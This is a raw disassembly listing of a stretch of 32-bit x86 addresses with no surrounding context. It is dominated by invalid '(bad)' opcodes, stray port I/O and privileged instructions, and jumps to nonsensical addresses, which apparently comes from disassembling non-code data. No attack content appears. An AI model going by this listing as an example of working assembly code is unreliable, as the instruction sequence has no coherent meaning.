  41c0a3:	and    dl,dl
  41c0a5:	data16 shr BYTE PTR [ebp+0x52],0xa1
  41c0aa:	icebp  
  41c0ab:	mov    ch,bl
  41c0ad:	sub    esi,DWORD PTR [eax-0x1f21d37f]
  41c0b3:	add    ch,ch
  41c0b5:	stc    
  41c0b6:	cwde   
  41c0b7:	xlat   BYTE PTR ds:[ebx]
  41c0b8:	jg     0x41c0ad
  41c0ba:	fiadd  DWORD PTR [edx]
  41c0bc:	push   edi
  41c0bd:	outs   dx,BYTE PTR ds:[esi]
  41c0be:	sbb    eax,0x6dc60e17
  41c0c3:	push   cs
  41c0c4:	loopne 0x41c0a0
  41c0c6:	mov    al,0x39
  41c0c8:	scas   eax,DWORD PTR es:[edi]
  41c0c9:	inc    edi
  41c0ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0cb:	jg     0x41c089
  41c0cd:	xchg   edx,eax
  41c0ce:	mov    cl,0x14
  41c0d0:	xlat   BYTE PTR ds:[ebx]
  41c0d1:	cs mov cl,0x1f
  41c0d4:	push   0x59b5f53b
  41c0d9:	stos   BYTE PTR es:[edi],al
  41c0da:	pop    edi
  41c0db:	jmp    0xd72fdc6a
  41c0e0:	mov    bl,0x1b
  41c0e2:	push   ds
  41c0e3:	fcom   st(3)
  41c0e5:	jnp    0x41c0f2
  41c0e7:	(bad)  
  41c0e8:	cli    
  41c0e9:	pop    ecx
  41c0ea:	pusha  
  41c0eb:	adc    cl,0x3e
  41c0ee:	mov    WORD PTR [edx+0x20],cs
  41c0f1:	jbe    0x41c0d0
  41c0f3:	dec    esp
  41c0f4:	dec    ebx
  41c0f5:	test   eax,0xe8110d08
  41c0fa:	jb     0x41c082
  41c0fc:	aam    0x6c
  41c0fe:	test   dh,dh
  41c100:	lods   al,BYTE PTR ds:[esi]
  41c101:	cdq    
  41c102:	jmp    0xe0a5:0x6e501688
  41c109:	lods   eax,DWORD PTR ds:[esi]
  41c10a:	add    eax,0x8a1b3f4
  41c10f:	cwde   
  41c110:	imul   eax,DWORD PTR [eax],0x0
	...
  41c172:	add    BYTE PTR [eax],al
  41c174:	(bad)  [edx-0x5f]
  41c177:	clc    
  41c178:	mov    bl,0xfb
  41c17a:	fldcw  WORD PTR [ebx+0x3d]
  41c17d:	add    DWORD PTR ds:0x409cdee9,eax
  41c183:	dec    BYTE PTR [edi+0x500012a]
  41c189:	add    DWORD PTR [eax],eax
  41c18b:	add    BYTE PTR [eax-0x3f15695e],bh
  41c191:	push   ecx
  41c192:	jp     0x41c14b
  41c194:	aas    
  41c195:	push   edx
  41c196:	or     DWORD PTR [ebp-0xd39ec0e],ebx
  41c19c:	push   esp
  41c19d:	mov    ch,0xe0
  41c19f:	push   0xffffffe0
  41c1a1:	into   
  41c1a2:	fidivr WORD PTR [esp+ebp*2+0x5d6b326b]
  41c1a9:	(bad)  
  41c1aa:	mov    eax,0xff541f1b
  41c1af:	sbb    eax,0xd310e325
  41c1b4:	mov    eax,0x6494d2f9
  41c1b9:	js     0x41c20a
  41c1bb:	in     eax,dx
  41c1bc:	sbb    bl,BYTE PTR [edx-0x2]
  41c1bf:	loop   0x41c1f1
  41c1c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1c2:	out    0xbe,al
  41c1c4:	(bad)  
  41c1c5:	adc    ebx,edi
  41c1c7:	rcl    BYTE PTR [ecx-0x1a],0x2d
  41c1cb:	ss xor edi,edi
  41c1ce:	jnp    0x41c241
  41c1d0:	aam    0x34
  41c1d2:	jb     0x41c1f8
  41c1d4:	daa    
  41c1d5:	xchg   DWORD PTR [edx+0x88d7c4c],ecx
  41c1db:	shl    al,1
  41c1dd:	in     eax,0xc7
  41c1df:	pushf  
  41c1e0:	xchg   ecx,eax
  41c1e1:	ja     0x41c1b4
  41c1e3:	fstp   QWORD PTR [ecx-0x11]
  41c1e6:	xor    BYTE PTR [esi+0x7b69860],0x72
  41c1ed:	mov    al,0x26
  41c1ef:	mov    ebx,0xbd3e232
  41c1f4:	push   edi
  41c1f5:	inc    esp
  41c1f7:	scas   al,BYTE PTR es:[edi]
  41c1f8:	(bad)  
  41c1f9:	mov    al,ds:0x5ae8f3f4
  41c1fe:	jno    0x41c257
  41c200:	and    al,0xe1
  41c202:	or     al,0x18
  41c204:	dec    edi
  41c205:	pop    ss
  41c206:	cmp    al,0x73
  41c208:	push   ebx
  41c209:	sbb    DWORD PTR [ebp+0x37b13da6],esi
  41c20f:	push   ecx
  41c210:	dec    esp
  41c211:	cmp    BYTE PTR [ecx+edx*1],al
  41c214:	pop    esi
  41c215:	cmp    dh,BYTE PTR [edx+0x85093b3]
  41c21b:	adc    al,0xae
  41c21d:	rcr    bh,1
  41c21f:	mov    ah,0x7e
  41c221:	(bad)  
  41c222:	or     ch,dh
  41c224:	fs cli 
  41c226:	dec    eax
  41c227:	or     DWORD PTR [ecx],ecx
  41c229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c22a:	addr16 (bad) 
  41c22c:	sbb    ch,dl
  41c22e:	ret    0xd35d
  41c231:	rol    BYTE PTR [edi-0x2f],0xee
  41c235:	sub    DWORD PTR [edi+edi*1+0xd496851],edi
  41c23c:	sbb    eax,0xd9b13a45
  41c241:	enter  0xbdda,0xf4
  41c245:	sub    DWORD PTR [eax+0x2a],eax
  41c248:	push   esi
  41c249:	ins    DWORD PTR es:[edi],dx
  41c24a:	jb     0x41c25c
  41c24c:	call   0x4eff9dd5
  41c251:	dec    edx
  41c252:	pop    edi
  41c253:	lds    ebx,FWORD PTR [edx+0x64]
  41c256:	adc    al,0x6d
  41c258:	add    ebp,DWORD PTR [edi-0x4776bcd9]
  41c25e:	mov    al,ds:0x8dcbefd1
  41c263:	push   esi
  41c264:	jge    0x41c2a6
  41c266:	inc    BYTE PTR [edx+0x162bc39e]
  41c26c:	jle    0x41c260
  41c26e:	inc    ebp
  41c26f:	push   0xe58d2f44
  41c274:	inc    edx
  41c275:	in     al,dx
  41c276:	dec    esi
  41c277:	popa   
  41c278:	mov    bl,0x58
  41c27a:	add    ecx,DWORD PTR [esi-0x655f346e]
  41c280:	adc    al,BYTE PTR [edi]
  41c282:	mov    ah,0x82
  41c284:	cmp    cl,BYTE PTR [eax-0x18]
  41c287:	(bad)  
  41c288:	lahf   
  41c289:	stos   DWORD PTR es:[edi],eax
  41c28a:	ss mov dl,0xa
  41c28e:	stc    
  41c28f:	shr    eax,1
	...
  41c2f1:	add    BYTE PTR [eax],al
  41c2f3:	add    bl,dh
  41c2f5:	and    ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	mov    edi,edi
  41c302:	pop    ds
  41c303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c304:	xchg   esp,eax
  41c305:	sub    eax,DWORD PTR [ecx]
  41c307:	add    BYTE PTR ds:0x98000001,al
  41c30d:	arpl   WORD PTR ds:0xf635a77d,di
  41c313:	xchg   edi,eax
  41c314:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c315:	adc    dh,bl
  41c317:	cdq    
  41c318:	(bad)  
  41c319:	test   al,0x92
  41c31b:	xchg   ebp,eax
  41c31c:	fdivr  DWORD PTR [edx-0xb]
  41c31f:	or     BYTE PTR [ecx+esi*2],bh
  41c322:	jnp    0x41c375
  41c324:	mov    dh,0x8d
  41c326:	cli    
  41c327:	inc    eax
  41c328:	mov    bh,0xcb
  41c32a:	test   eax,0x57f12a70
  41c32f:	jecxz  0x41c39e
  41c331:	mov    bh,0xe1
  41c333:	fs sahf 
  41c335:	push   esp
  41c336:	int3   
  41c337:	into   
  41c338:	test   BYTE PTR [esi-0x5ca019b7],ah
  41c33e:	mov    ds:0x997fc1b2,eax
  41c343:	in     al,dx
  41c344:	dec    ebx
  41c345:	and    ebx,edx
  41c347:	in     al,dx
  41c348:	popa   
  41c349:	xor    BYTE PTR ds:0xc0ffef76,dh
  41c34f:	xor    eax,0x980d5039
  41c354:	mov    dh,0xb4
  41c356:	pop    edx
  41c357:	or     eax,0x8a4d175a
  41c35c:	imul   BYTE PTR [esi-0x1c]
  41c35f:	addr16 icebp 
  41c361:	stos   DWORD PTR es:[edi],eax
  41c362:	aad    0x42
  41c364:	clc    
  41c365:	add    DWORD PTR [eax-0x1f],esp
  41c368:	add    eax,0xd2358646
  41c36d:	fisub  WORD PTR [ecx+0x8]
  41c370:	jne    0x41c368
  41c372:	les    ebp,FWORD PTR ds:0x6ebc15d4
  41c378:	fsubrp st(4),st
  41c37a:	add    BYTE PTR ds:0x3122bc22,bh
  41c380:	jae    0x41c311
  41c382:	pop    esi
  41c383:	rol    dh,cl
  41c385:	jae    0x41c377
  41c387:	cmp    cl,dl
  41c389:	rcl    BYTE PTR [edi],cl
  41c38b:	stc    
  41c38c:	shl    dl,1
  41c38e:	stos   BYTE PTR es:[edi],al
  41c38f:	fst    st(7)
  41c391:	in     eax,dx
  41c392:	hlt    
  41c393:	js     0x41c31a
  41c395:	imul   edx,eax,0xffffff9d
  41c398:	fwait
  41c399:	pop    ss
  41c39a:	sub    eax,0xddb6b29f
  41c39f:	aam    0xc9
  41c3a1:	sbb    BYTE PTR [edx+esi*4],0xb8
  41c3a5:	jl     0x41c3ba
  41c3a7:	in     eax,0xd8
  41c3a9:	jnp    0x41c3dc
  41c3ab:	dec    edi
  41c3ac:	sub    dh,BYTE PTR [ecx]
  41c3ae:	mov    ebp,0x3ab37076
  41c3b3:	push   ss
  41c3b4:	pop    ebp
  41c3b5:	pop    ds
  41c3b6:	ror    dl,0x7d
  41c3b9:	scas   al,BYTE PTR es:[edi]
  41c3ba:	cdq    
  41c3bb:	mov    bl,0xe9
  41c3bd:	shl    BYTE PTR [eax-0x5],cl
  41c3c0:	pop    es
  41c3c1:	iret   
  41c3c2:	std    
  41c3c3:	mov    al,ds:0x27f91bfa
  41c3c8:	inc    eax
  41c3c9:	leave  
  41c3ca:	dec    edi
  41c3cb:	gs mov ah,0xf0
  41c3ce:	out    0xc2,eax
  41c3d0:	jg     0x41c3a3
  41c3d2:	popf   
  41c3d3:	or     al,BYTE PTR ds:[esi-0x13]
  41c3d7:	fs mov bl,0x2f
  41c3da:	ja     0x41c416
  41c3dc:	into   
  41c3dd:	and    BYTE PTR [edi+0xef86700],bh
  41c3e3:	pop    ebp
  41c3e4:	xor    eax,0x91f8f8a0
  41c3e9:	pop    ebx
  41c3ea:	(bad)  [esi]
  41c3ec:	bound  edi,QWORD PTR [ebp+0x5c]
  41c3ef:	in     eax,0x69
  41c3f1:	ret    
  41c3f2:	hlt    
  41c3f3:	jnp    0x41c457
  41c3f5:	or     BYTE PTR [ebx+0x30],0x7a
  41c3f9:	xchg   edx,eax
  41c3fa:	jae    0x41c3a8
  41c3fc:	pop    esi
  41c3fd:	das    
  41c3fe:	jae    0x41c383
  41c400:	dec    edx
  41c401:	sub    eax,0x2ef52b1f
  41c406:	jne    0x41c452
  41c408:	mov    WORD PTR [eax+0x7a],?
  41c40b:	stos   BYTE PTR es:[edi],al
  41c40c:	enter  0x79a,0x73
  41c410:	pop    ebp
	...
  41c471:	add    BYTE PTR [eax],al
  41c473:	add    BYTE PTR [ebx+0x20],dl
  41c476:	mov    al,ds:0x5faef3ae
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	fcmovnb st,st(5)
  41c482:	lds    edi,FWORD PTR [ecx-0x67]
  41c485:	sub    al,0x1
  41c487:	add    BYTE PTR ds:0xe4000001,al
  41c48d:	mov    cl,ch
  41c48f:	xchg   ebx,eax
  41c490:	adc    ch,BYTE PTR [ecx]
  41c492:	sar    BYTE PTR [ebx+0x16],cl
  41c495:	push   esp
  41c496:	jae    0x41c4b5
  41c498:	call   0xdecb0e55
  41c49d:	jbe    0x41c50e
  41c49f:	mov    eax,ds:0x9e6e1f83
  41c4a4:	xlat   BYTE PTR ds:[ebx]
  41c4a5:	cmp    dh,bl
  41c4a7:	mov    esp,0x199a32a0
  41c4ac:	jmp    0x41c4c8
  41c4ae:	into   
  41c4af:	pusha  
  41c4b0:	inc    ebp
  41c4b1:	scas   eax,DWORD PTR es:[edi]
  41c4b2:	sub    DWORD PTR ds:0x855d1eb6,edi
  41c4b8:	ret    
  41c4b9:	xor    edx,DWORD PTR [ebp-0x5c]
  41c4bc:	dec    esp
  41c4bd:	out    0xc4,al
  41c4bf:	gs jle 0x41c48e
  41c4c2:	ret    
  41c4c3:	ror    BYTE PTR [ebx+0x95e8233],1
  41c4c9:	add    al,0xb3
  41c4cb:	push   edx
  41c4cc:	fild   WORD PTR [ecx+0x55]
  41c4cf:	mov    ax,ds:0xd75eb62a
  41c4d5:	mov    DWORD PTR [edi-0x4abea2da],eax
  41c4db:	jmp    0x7c240ba8
  41c4e0:	xchg   ebx,eax
  41c4e1:	repnz cwde 
  41c4e3:	sbb    eax,0xd536c1fd
  41c4e8:	adc    BYTE PTR [ecx+0x3a45a550],ch
  41c4ee:	mov    bh,0x55
  41c4f0:	sbb    ah,BYTE PTR [ecx+ebp*1]
  41c4f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4f4:	es inc esi
  41c4f6:	inc    edx
  41c4f7:	sub    eax,0x3cba09f8
  41c4fc:	push   DWORD PTR [eax+0x25819717]
  41c502:	dec    ecx
  41c503:	mov    WORD PTR [ebx+edi*2+0x20],?
  41c507:	add    bh,ah
  41c509:	test   BYTE PTR [ebp+0x55e67727],dh
  41c50f:	add    esp,esi
  41c511:	lods   al,BYTE PTR ds:[esi]
  41c512:	fcom   QWORD PTR [esi*8-0x6b252dd2]
  41c519:	xchg   ecx,eax
  41c51a:	es iret 
  41c51c:	dec    edi
  41c51d:	pop    eax
  41c51e:	retf   0xa239
  41c521:	xor    BYTE PTR [ebp+0x7205fc7a],dh
  41c527:	vmovntpd YMMWORD PTR [edi],ymm0
  41c52b:	fcom   DWORD PTR [esi]
  41c52d:	cmp    BYTE PTR [edx],0xd6
  41c530:	xchg   esi,eax
  41c531:	mov    edx,0x856e36b6
  41c536:	leave  
  41c537:	fidiv  DWORD PTR [ecx-0x214f0a3b]
  41c53d:	rcr    DWORD PTR [eax-0x3a],cl
  41c540:	bnd jle 0x41c50e
  41c543:	aad    0xf6
  41c545:	cmp    eax,0x4657016d
  41c54a:	fcomp  st(3)
  41c54c:	jo     0x41c578
  41c54e:	mov    ebx,0x77df301f
  41c553:	je     0x41c5b2
  41c555:	daa    
  41c556:	mov    cs,WORD PTR [ecx]
  41c558:	loope  0x41c4eb
  41c55a:	mov    bh,BYTE PTR [edi+edx*2]
  41c55d:	ret    0x78b2
  41c560:	sbb    eax,DWORD PTR [esi-0x10]
  41c563:	jge    0x41c59f
  41c565:	push   ebp
  41c566:	(bad)  
  41c567:	dec    esi
  41c568:	ror    DWORD PTR [esi],1
  41c56a:	sar    ebx,1
  41c56c:	pop    es
  41c56d:	xor    dl,cl
  41c56f:	or     edi,esi
  41c571:	mov    eax,esp
  41c573:	pop    ebp
  41c574:	xor    DWORD PTR [ebx-0xd],0x45
  41c578:	mov    ds:0x5b393586,al
  41c57d:	adc    eax,eax
  41c57f:	jle    0x41c59c
  41c581:	inc    ebx
  41c582:	lods   al,BYTE PTR ds:[esi]
  41c583:	push   esi
  41c584:	iret   
  41c585:	dec    edi
  41c586:	int    0x42
  41c588:	dec    eax
  41c589:	mov    eax,ds:0x4d9f0745
  41c58e:	imul   esi,DWORD PTR [esi-0x5c],0x0
	...
  41c5f2:	add    BYTE PTR [eax],al
  41c5f4:	lds    esp,FWORD PTR [ebx]
  41c5f6:	xchg   ecx,eax
  41c5f7:	and    eax,0xe3f5b7f7
  41c5fc:	inc    ebx
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d9e:0x65605b27
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    eax,0xe5000001
  41c60d:	mov    WORD PTR [ebp+edi*2+0x26],cs
  41c611:	fidivr WORD PTR ds:0x925e593e
  41c617:	push   eax
  41c618:	iret   
  41c619:	ret    0x1bef
  41c61c:	add    al,0x2e
  41c61e:	clc    
  41c61f:	inc    edx
  41c620:	mov    esi,0x334761ab
  41c625:	pop    edx
  41c626:	inc    DWORD PTR [edx+0x72ebab9]
  41c62c:	test   DWORD PTR [edi],esi
  41c62e:	je     0x41c65e
  41c630:	int3   
  41c631:	mov    BYTE PTR [eax+0x1a],dh
  41c634:	addps  xmm4,XMMWORD PTR [ecx]
  41c637:	push   edx
  41c638:	mov    ds:0x1c98cc63,eax
  41c63d:	(bad)  
  41c63e:	jg     0x41c5fc
  41c640:	out    dx,eax
  41c641:	popf   
  41c642:	push   edx
  41c643:	fdivr  DWORD PTR [ebx]
  41c645:	xchg   ebx,eax
  41c646:	adc    esi,ebx
  41c648:	cmc    
  41c649:	adc    DWORD PTR [ebx+0x5334195e],edx
  41c64f:	clc    
  41c650:	(bad)  
  41c651:	std    
  41c652:	mov    esp,0xc2bca0bf
  41c657:	ds pop esp
  41c659:	scas   eax,DWORD PTR es:[edi]
  41c65a:	(bad)  
  41c65b:	fsubp  st(4),st
  41c65d:	pop    ecx
  41c65e:	mov    bh,0x5e
  41c660:	bound  eax,QWORD PTR [ecx+0x7]
  41c663:	adc    al,bl
  41c665:	sar    BYTE PTR [esi-0x1f802005],1
  41c66b:	ror    al,1
  41c66d:	cmp    ebp,DWORD PTR [ebx+0x14]
  41c670:	idiv   DWORD PTR [ebx-0x7d]
  41c673:	dec    esi
  41c674:	and    edx,DWORD PTR [edx-0x29]
  41c677:	mov    ds:0x6d73415,al
  41c67c:	adc    ah,bl
  41c67e:	pop    esp
  41c67f:	lock retf 0xe967
  41c683:	jno    0x41c694
  41c685:	or     ebx,DWORD PTR [ebp-0x5ed47aa8]
  41c68b:	and    al,0xcc
  41c68e:	shl    DWORD PTR [edx],1
  41c690:	rol    DWORD PTR [edx],cl
  41c692:	rol    dh,1
  41c694:	fst    DWORD PTR [ebx+0x1]
  41c697:	hlt    
  41c698:	pop    ss
  41c699:	xor    al,0xb6
  41c69b:	fnstsw WORD PTR [ebx+edi*1-0x2d6cd994]
  41c6a2:	sti    
  41c6a3:	sub    DWORD PTR [ecx-0x43],esp
  41c6a6:	jne    0x41c6d9
  41c6a8:	cs pop ds
  41c6aa:	bound  esi,QWORD PTR [ebp+0x2a]
  41c6ad:	dec    esi
  41c6ae:	pop    es
  41c6af:	sub    ah,BYTE PTR [esi-0x7e5907db]
  41c6b5:	push   edx
  41c6b6:	imul   edx,DWORD PTR [edi+edi*2],0xacc2b9c4
  41c6bd:	sub    BYTE PTR [ecx],bl
  41c6bf:	(bad)  
  41c6c0:	and    eax,0x49b37022
  41c6c5:	mov    dh,0x72
  41c6c7:	pop    ebx
  41c6c8:	or     al,0x22
  41c6ca:	xlat   BYTE PTR ds:[ebx]
  41c6cb:	data16 fwait
  41c6cd:	pusha  
  41c6ce:	fucomp st(2)
  41c6d0:	and    eax,0x32fce5df
  41c6d5:	sbb    eax,0xee57742b
  41c6da:	inc    DWORD PTR [edx-0x4fee51cf]
  41c6e0:	and    edi,DWORD PTR [esi+ebp*8-0x76]
  41c6e4:	jmp    0x1c12fdc1
  41c6e9:	mov    dh,0x38
  41c6eb:	and    eax,0xe94ce873
  41c6f0:	and    esi,DWORD PTR [ebx+0x67]
  41c6f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6f4:	jnp    0x41c73b
  41c6f6:	pop    edi
  41c6f7:	data16 jp 0x41c71a
  41c6fa:	lods   eax,DWORD PTR ds:[esi]
  41c6fb:	xor    al,0xf
  41c6fd:	push   esp
  41c6fe:	sahf   
  41c6ff:	xor    cl,0x9f
  41c702:	mov    ah,dl
  41c704:	push   0x67c02084
  41c709:	mov    ah,0xc9
  41c70b:	pop    eax
  41c70c:	fdivr  QWORD PTR [ecx+0x43]
  41c70f:	sub    DWORD PTR [edi+0x0],ecx
	...
  41c772:	add    BYTE PTR [eax],al
  41c774:	fiadd  DWORD PTR [ecx]
  41c776:	ret    0xdb86
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	jmp    0x41c79d
  41c782:	sbb    eax,0x12ea34e
  41c787:	add    BYTE PTR ds:0x43000001,al
  41c78d:	cmp    DWORD PTR [ecx-0x163a0917],0xd026a490
  41c797:	mov    ch,0x75
  41c799:	push   ss
  41c79a:	call   0x7d96:0x82030e3
  41c7a1:	adc    BYTE PTR [esi-0x4c],al
  41c7a4:	sbb    ebp,eax
  41c7a6:	icebp  
  41c7a7:	xor    BYTE PTR [ebp+ecx*2+0x15],bh
  41c7ab:	pop    ds
  41c7ac:	mov    dl,0x34
  41c7ae:	aad    0x4
  41c7b0:	adc    DWORD PTR [edx+0x29],esp
  41c7b3:	fistp  WORD PTR [ecx+0x42]
  41c7b6:	adc    BYTE PTR [ecx+0x35],dl
  41c7b9:	retf   0x5cdf
  41c7bc:	push   0xffffffb4
  41c7be:	pop    ds
  41c7bf:	scas   eax,DWORD PTR es:[edi]
  41c7c0:	sbb    al,BYTE PTR [ebp+0x6a]
  41c7c3:	cs daa 
  41c7c5:	xchg   edi,eax
  41c7c6:	repnz mov ecx,0xcf0ffbd6
  41c7cc:	pusha  
  41c7cd:	inc    ecx
  41c7ce:	pop    ds
  41c7cf:	and    DWORD PTR [edx],esi
  41c7d1:	cmp    DWORD PTR [eax+0x576cfe3b],ebx
  41c7d7:	retf   0x59fa
  41c7da:	outs   dx,BYTE PTR ds:[esi]
  41c7db:	jl     0x41c7bc
  41c7dd:	pusha  
  41c7de:	ret    0x7079
  41c7e1:	cli    
  41c7e2:	(bad)  
  41c7e3:	jmp    0x2c5fcb91
  41c7e8:	cli    
  41c7e9:	arpl   WORD PTR [ebx+eax*4],si
  41c7ec:	sbb    esp,DWORD PTR [edi-0x49f5c4bb]
  41c7f2:	mov    eax,0xb2c9c27f
  41c7f7:	imul   esp,edx,0x17c34b3c
  41c7fd:	cmp    eax,0xa532efaf
  41c802:	sub    eax,0xb8d18870
  41c807:	nop
  41c808:	push   0x24136bb6
  41c80d:	mov    dh,0x44
  41c80f:	arpl   WORD PTR [ebx],di
  41c811:	mov    edi,0x67c38f29
  41c816:	sahf   
  41c817:	push   0x64617a09
  41c81c:	jns    0x41c85c
  41c81e:	pop    ebx
  41c81f:	(bad)  
  41c820:	fidiv  WORD PTR [edi-0x42]
  41c823:	xchg   ecx,eax
  41c824:	inc    ebx
  41c825:	adc    ah,BYTE PTR fs:[ebx]
  41c828:	jp     0x41c804
  41c82a:	pop    es
  41c82b:	sub    eax,0x308ed348
  41c830:	jg     0x41c7e0
  41c832:	cmp    cl,cl
  41c834:	add    DWORD PTR [ecx-0x4],edi
  41c837:	pop    edi
  41c838:	mov    al,ds:0x904b062f
  41c83d:	mov    dl,0xf
  41c83f:	xor    al,0x1d
  41c841:	and    BYTE PTR [edx],dh
  41c843:	sahf   
  41c844:	aam    0x71
  41c846:	jecxz  0x41c85e
  41c848:	outs   dx,DWORD PTR ds:[esi]
  41c849:	je     0x41c8c8
  41c84b:	sbb    bl,BYTE PTR [edx]
  41c84d:	sub    cl,BYTE PTR [edx]
  41c84f:	loopne 0x41c806
  41c851:	add    bh,BYTE PTR [ecx+0x74]
  41c854:	or     eax,DWORD PTR ds:0xd6cc2cc6
  41c85a:	ficom  DWORD PTR [ebx]
  41c85c:	dec    edx
  41c85d:	xchg   ecx,eax
  41c85e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c85f:	call   0xdb4ee390
  41c864:	mov    BYTE PTR [esi+esi*2-0x1037a422],bh
  41c86b:	cmp    al,BYTE PTR [esi]
  41c86d:	pop    esi
  41c86e:	popf   
  41c86f:	or     bl,ah
  41c871:	fs sti 
  41c873:	pop    edx
  41c874:	add    ecx,DWORD PTR [ebx]
  41c876:	fdivr  QWORD PTR [ebx-0x60]
  41c879:	xor    BYTE PTR [esi-0x21],dh
  41c87c:	push   esp
  41c87d:	cmovo  ebp,DWORD PTR ss:[esi+eax*2-0x2b]
  41c883:	mov    al,0xc2
  41c885:	mov    ah,0xf7
  41c887:	mov    ch,0x55
  41c889:	mov    edx,gs
  41c88b:	xchg   ebp,eax
  41c88c:	mov    al,0xd2
  41c88e:	test   eax,0xa52f
	...
  41c8f3:	add    BYTE PTR [ebx+0x34],ah
  41c8f6:	lods   eax,DWORD PTR ds:[esi]
  41c8f7:	xor    al,0xff
  41c8f9:	mov    ebp,0x291877fb
  41c8fe:	cmp    eax,DWORD PTR [ecx]
  41c900:	xchg   edx,eax
  41c901:	cmp    al,0xbd
  41c903:	loopne 0x41c8ad
  41c905:	das    
  41c906:	add    DWORD PTR [eax],eax
  41c908:	add    eax,0x64000001
  41c90d:	xchg   edx,eax
  41c90e:	pop    edx
  41c90f:	cmc    
  41c910:	and    al,0x7f
  41c912:	sub    bl,BYTE PTR [eax]
  41c914:	adc    al,0xf1
  41c916:	xor    eax,0xdb3c9952
  41c91b:	pop    edi
  41c91c:	mov    DWORD PTR [ebx-0x64],esp
  41c91f:	sbb    al,dh
  41c921:	cld    
  41c922:	xor    al,0xc9
  41c924:	into   
  41c925:	push   eax
  41c926:	sub    al,BYTE PTR [ebp-0x7aff02eb]
  41c92c:	adc    dl,al
  41c92e:	jno    0x41c8c0
  41c930:	pusha  
  41c931:	out    dx,al
  41c932:	jbe    0x41c913
  41c934:	das    
  41c935:	dec    edx
  41c936:	sbb    BYTE PTR [edi],al
  41c938:	push   0xde2df9b5
  41c93d:	bound  edi,QWORD PTR [eax-0x16]
  41c940:	bnd je 0x41c8f5
  41c943:	in     eax,0x40
  41c945:	mov    bl,0xef
  41c947:	jno    0x41c908
  41c949:	ret    
  41c94a:	(bad)  
  41c94b:	push   esp
  41c94c:	les    esi,FWORD PTR [edx+edi*1+0x4c]
  41c950:	push   esp
  41c951:	or     ebx,DWORD PTR [edi]
  41c953:	jo     0x41c9b8
  41c955:	mov    esp,es
  41c957:	int    0x79
  41c959:	push   0x22ae73d4
  41c95e:	nop
  41c95f:	lahf   
  41c960:	push   ebx
  41c961:	add    al,0x58
  41c963:	out    dx,al
  41c964:	push   edx
  41c965:	fidiv  DWORD PTR [edi-0x7e50e8da]
  41c96b:	rcr    cl,0xac
  41c96e:	test   al,0xfc
  41c970:	not    ah
  41c972:	hlt    
  41c973:	retf   
  41c974:	hlt    
  41c975:	or     eax,0x80cef2ef
  41c97a:	mov    esi,0xaf5f03e4
  41c97f:	push   edx
  41c980:	nop
  41c981:	fbstp  TBYTE PTR [ecx-0x3f]
  41c984:	shl    DWORD PTR [ecx+0x2],0x9
  41c988:	fucomi st,st(4)
  41c98a:	into   
  41c98b:	inc    edi
  41c98c:	nop
  41c98d:	cli    
  41c98e:	xchg   ah,bl
  41c990:	adc    edi,DWORD PTR [ecx-0x34]
  41c993:	mov    DWORD PTR [ebp+0xa4748d9],esp
  41c999:	push   esp
  41c99a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c99b:	cld    
  41c99c:	inc    DWORD PTR [edi+0x2c]
  41c99f:	daa    
  41c9a0:	inc    eax
  41c9a1:	jns    0x41c9ca
  41c9a3:	ficom  WORD PTR [edi]
  41c9a5:	(bad)  
  41c9a7:	lea    esp,[edi]
  41c9a9:	push   ebx
  41c9aa:	ficomp DWORD PTR [ecx-0x1b]
  41c9ad:	mov    WORD PTR [ebx+esi*8-0x2d],?
  41c9b1:	loope  0x41c994
  41c9b3:	sahf   
  41c9b4:	push   edi
  41c9b5:	add    ah,bh
  41c9b7:	sahf   
  41c9b8:	rcl    DWORD PTR [edi+0x16],1
  41c9bb:	ins    DWORD PTR es:[edi],dx
  41c9bc:	fisubr DWORD PTR [esi]
  41c9be:	mov    edx,0xc89ee5f3
  41c9c3:	imul   ebp,DWORD PTR [eax],0xffffffbf
  41c9c6:	repnz mov ch,0xd8
  41c9c9:	hlt    
  41c9ca:	inc    ecx
  41c9cb:	xchg   dl,dl
  41c9cd:	xor    ecx,DWORD PTR [esi-0x1c10762e]
  41c9d3:	fld    QWORD PTR [eax+0x3ed63d41]
  41c9d9:	aaa    
  41c9da:	mov    WORD PTR [edi],?
  41c9dc:	push   edx
  41c9dd:	out    0x16,eax
  41c9df:	inc    ecx
  41c9e0:	dec    ebp
  41c9e1:	mov    edx,0xd3016ebd
  41c9e6:	add    eax,0x438c646f
  41c9eb:	adc    al,0xfc
  41c9ed:	lods   al,BYTE PTR ds:[esi]
  41c9ee:	mov    ah,0xd6
  41c9f0:	cmpxchg BYTE PTR [edx-0x7d],bh
  41c9f4:	mov    al,0x2a
  41c9f6:	mov    BYTE PTR ds:0xb89bca52,0x4f
  41c9fd:	into   
  41c9fe:	inc    eax
  41c9ff:	mov    ecx,0x4fed1126
  41ca04:	push   ecx
  41ca05:	pop    eax
  41ca06:	cmp    BYTE PTR [ebp-0x7],dl
  41ca09:	xchg   edx,eax
  41ca0a:	or     BYTE PTR [edi],al
  41ca0c:	add    al,0xd0
  41ca0e:	repz out dx,al
  41ca10:	sub    eax,0x0
	...
  41ca71:	add    BYTE PTR [eax],al
  41ca73:	add    al,dh
  41ca75:	retf   0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	pushf  
  41ca81:	das    
  41ca82:	cmp    BYTE PTR [ebp+ebp*4+0x5000130],bl
  41ca89:	add    DWORD PTR [eax],eax
  41ca8b:	add    BYTE PTR [ecx],dh
  41ca8d:	fdivp  st(2),st
